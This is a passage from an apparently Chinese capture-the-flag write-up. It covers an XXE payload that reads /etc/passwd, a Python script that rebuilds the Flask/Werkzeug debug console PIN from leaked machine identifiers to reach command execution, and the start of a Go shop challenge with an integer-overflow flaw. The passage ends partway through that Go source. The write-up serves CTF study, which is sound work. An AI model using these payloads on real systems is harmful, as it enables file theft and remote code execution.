punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÖ∂‰ªñÂú∞ÊñπÊ≤°ÊúâÊâæÂà∞ÂèØÁñëÁöÑ„ÄÇ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/0a88ca131ec844ffb15b55cb126ffc1d.png" alt="465"><br><code>etree.parse</code>Ëß£ÊûêxmlÊï∞ÊçÆÔºåÂèØËÉΩ‰ºöÂá∫Áé∞ÊºèÊ¥û„ÄÇ<br>Âú®Ëá™Â∑±ÊúçÂä°Âô®‰∏äÂàõÂª∫‰∏Ä‰∏™xmlÊñá‰ª∂<code>index.xml</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY file SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rss</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>atom</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2005/Atom<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>channel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>channel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rss</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéÂºÄÂêØ‰∏Ä‰∏™httpÊúçÂä°<br>Èù∂Êú∫ËÆøÈóÆËØ•Êñá‰ª∂ÔºåÂèëÁé∞ÊàêÂäüËØªÂèñÂà∞<code>/etc/passwd</code>Êñá‰ª∂„ÄÇ<br><img src="https://img-blog.csdnimg.cn/a4bc997150e64f3ba3b3ab94b5067603.png" alt="1"><br>Áî±‰∫éÂèØ‰ª•ËøõË°å‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåËÄå‰∏îËøòÊòØpythonÊê≠Âª∫ÁöÑÁΩëÁ´ôÔºåÁõ¥Êé•ËØªÂèñÊñá‰ª∂ËÆ°ÁÆópinÁ†Å„ÄÇ</p><h3 id="ËÆ°ÁÆópinÁ†Å"><a href="#ËÆ°ÁÆópinÁ†Å" class="headerlink" title="ËÆ°ÁÆópinÁ†Å"></a>ËÆ°ÁÆópinÁ†Å</h3><p>ËÆ°ÁÆópinÁ†ÅÊâÄÈúÄÊù°‰ª∂</p><ul><li>username Âú®ÂèØ‰ª•‰ªªÊÑèÊñá‰ª∂ËØªÁöÑÊù°‰ª∂‰∏ãËØª &#x2F;etc&#x2F;passwdËøõË°åÁåúÊµã</li><li>modname ÈªòËÆ§flask.app</li><li>appname ÈªòËÆ§Flask</li><li>moddir flaskÂ∫ì‰∏ãapp.pyÁöÑÁªùÂØπË∑ØÂæÑ,ÂèØ‰ª•ÈÄöËøáÊä•ÈîôÊãøÂà∞,Â¶Ç‰º†ÂèÇÁöÑÊó∂ÂÄôÁªô‰∏™‰∏çÂ≠òÂú®ÁöÑÂèòÈáè</li><li>uuidnode macÂú∞ÂùÄÁöÑÂçÅËøõÂà∂,‰ªªÊÑèÊñá‰ª∂ËØª &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</li><li>machine_id Êú∫Âô®Á†Å  #linuxÁöÑid‰∏ÄËà¨Â≠òÊîæÂú®&#x2F;etc&#x2F;machine-idÊàñ&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_idÔºådockerÈù∂Êú∫ÂàôËØªÂèñ&#x2F;proc&#x2F;self&#x2F;cgroup</li></ul><p>ËØªÂèñÂÆåÂØπÂ∫îÂÄºÂêéÂ°´ÂÖ•Áõ∏Â∫îËÑöÊú¨ËÆ°ÁÆópinÁ†Å</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'app'</span>  <span class="token comment"># /etc/passwd</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  <span class="token comment"># ÈªòËÆ§ÂÄº</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  <span class="token comment"># ÈªòËÆ§ÂÄº</span>    <span class="token string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span>  <span class="token comment"># Êä•ÈîôÂæóÂà∞</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485378088962'</span><span class="token punctuation">,</span>  <span class="token comment"># /sys/class/net/eth0/address ÂçÅËøõÂà∂</span>    <span class="token string">'fd3e34a4-6949-4575-83ed-79944fc5e148'</span>    <span class="token comment"># Â≠óÁ¨¶‰∏≤ÂêàÂπ∂Ôºö1./etc/machine-id(docker‰∏çÁî®Áúã) /proc/sys/kernel/random/boot_idÔºåÊúâboot-idÈÇ£Â∞±ÊãºÊé•boot-id 2. /proc/self/cgroup</span><span class="token punctuation">]</span><span class="token comment"># ‰∏ãÈù¢‰∏∫Ê∫êÁ†ÅÈáåÈù¢ÊäÑÁöÑÔºå‰∏çÈúÄË¶Å‰øÆÊîπ</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span><span class="token comment"># end up with the same value and generate out 9 digits</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token comment"># Format the pincode in groups of digits for easier remembering if</span><span class="token comment"># we don't have a result yet.</span>rv <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>            <span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞pinÁ†ÅÔºåÂ°´ÂÖ•ÂêéÂºÄÂßãÂëΩ‰ª§ÊâßË°å„ÄÇ<br><img src="https://img-blog.csdnimg.cn/925473e1a4c4477982a13855a341e2b0.png" alt="465"></p><h2 id="week3-GoShop"><a href="#week3-GoShop" class="headerlink" title="[week3] GoShop"></a>[week3] GoShop</h2><p>ËÄÉÁÇπÔºöÊï¥Êï∞Ê∫¢Âá∫<br>Êó¢ÁÑ∂ÊòØÂ§çÁé∞ÔºåÈÇ£Â∞±‰∏çË¶Å‰∏∫‰∫ÜÂÅöÈ¢òËÄåÂÅöÈ¢òÔºåÁùÄÈáçÂ≠¶‰π†ËøôÈÅìÈ¢òÁöÑËÄÉÁÇπ„ÄÇ</p><p>ËøôÈÅìÈ¢òÂ∞±ÊòØËÆ©Êàë‰ª¨Êù•‰π∞flagÔºå‰ª∑Ê†º‰∏∫999999999ÔºåÊ∂âÂèäÂà∞Êï∞Â≠óÂ§ßÁöÑÔºåÈÇ£ËÄÉÁÇπÂú®ËøôÈáåÁöÑÊ¶ÇÁéáÂ∞±ÂæàÂ§ß„ÄÇ<br><img src="https://img-blog.csdnimg.cn/21fa88c2de464768b427ee4010695e0c.png" alt="1"></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"crypto/rand"</span><span class="token string">"embed"</span><span class="token string">"fmt"</span><span class="token string">"github.com/gin-contrib/sessions"</span><span class="token string">"github.com/gin-contrib/sessions/cookie"</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token string">"github.com/google/uuid"</span><span class="token string">"html/template"</span><span class="token string">"net/http"</span><span class="token string">"os"</span><span class="token string">"strconv"</span><span class="token punctuation">)</span><span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Id    <span class="token builtin">string</span>Money <span class="token builtin">int64</span>Items <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> Product <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Name  <span class="token builtin">string</span>Price <span class="token builtin">int64</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> users <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token keyword">var</span> products <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product<span class="token comment">//go:embed public</span><span class="token keyword">var</span> fs embed<span class="token punctuation">.</span>FS<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>users <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token punctuation">)</span>products <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Apple"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Banana"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">50</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Orange"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Flag"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">999999999</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InfoHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"user"</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">ResetHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Reset success"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">BuyHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span><span class="token keyword">var</span> product <span class="token operator">*</span>Product<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span><span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>product <span class="token operator">=</span> v<span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> user<span class="token punctuation">.</span>Money <span class="token operator">>=</span> product<span class="token punctuation">.</span>Price<span class="token operator">*</span><span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>user<span class="token punctuation">.</span>Money <span class="token operator">-=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Buy %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough money"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">SellHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span><span class="token keyword">var</span> product <span class="token operator">*</span>Product<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span><span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>product <span class="token operator">=</span> v<span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>count <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> count <span class="token operator">>=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>user<span class="token punctuation">.</span>Money <span class="token operator">+=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token 